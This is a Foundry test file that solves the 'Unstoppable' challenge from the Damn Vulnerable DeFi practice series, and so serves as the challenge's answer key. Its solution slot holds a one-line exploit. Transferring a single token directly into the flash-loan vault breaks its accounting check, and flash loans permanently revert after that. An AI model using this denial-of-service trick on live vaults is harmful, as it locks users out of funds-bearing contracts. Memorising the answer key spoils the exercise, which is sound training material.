// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "@dev/forge-std/src/Test.sol";
import { DamnValuableToken } from "@contracts/CTF/Damn-Vulnerable-DeFi/00.Base/DamnValuableToken.sol";
import { ReceiverUnstoppable, UnstoppableVault } from "@contracts/CTF/Damn-Vulnerable-DeFi/01.Unstoppable.sol";

/*
    forge test --match-path foundry/test/CTF/Damn-Vulnerable-DeFi/01.Unstoppable.t.sol -vvvvv
*/

/* solhint-disable  reentrancy */
contract Challenge_1_Unstoppable_Test is Test {
    // hacking attack address
    address private deployer = address(1);
    address private feeRecipient = address(2);
    address private player = address(2333);
    DamnValuableToken private token;
    UnstoppableVault private vault;
    ReceiverUnstoppable private receiver;

    uint256 private TOKENS_IN_VAULT = 1_000_000 ether;
    uint256 private INITIAL_PLAYER_TOKEN_BALANCE = 10 ether;

    function setUp() public {
        vm.startPrank(deployer);
        _before();
        vm.stopPrank();

        vm.startPrank(player);
    }

    function _before() public {
        /* SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        token = new DamnValuableToken();
        vault = new UnstoppableVault(token, deployer, feeRecipient);
        assertEq(vault.feeRecipient(), feeRecipient);

        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(this));
        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT, "");
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT, "");
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT, "");
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT, "");
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0, "");
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50_000 ether, "");

        token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);

        receiver = new ReceiverUnstoppable(address(vault));
        receiver.executeFlashLoan(100 ether);
    }

    function test_Exploit() public {
        /* START CODE YOUR SOLUTION HERE */
        token.transfer(address(vault), 1);
        /* END CODE YOUR SOLUTION */

        vm.stopPrank();
        _after();
    }

    function _after() public {
        /* SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // It is no longer possible to execute flash loans
        vm.startPrank(deployer);
        vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
        receiver.executeFlashLoan(100 ether);
        vm.stopPrank();
    }
}
/* solhint-enable  reentrancy */
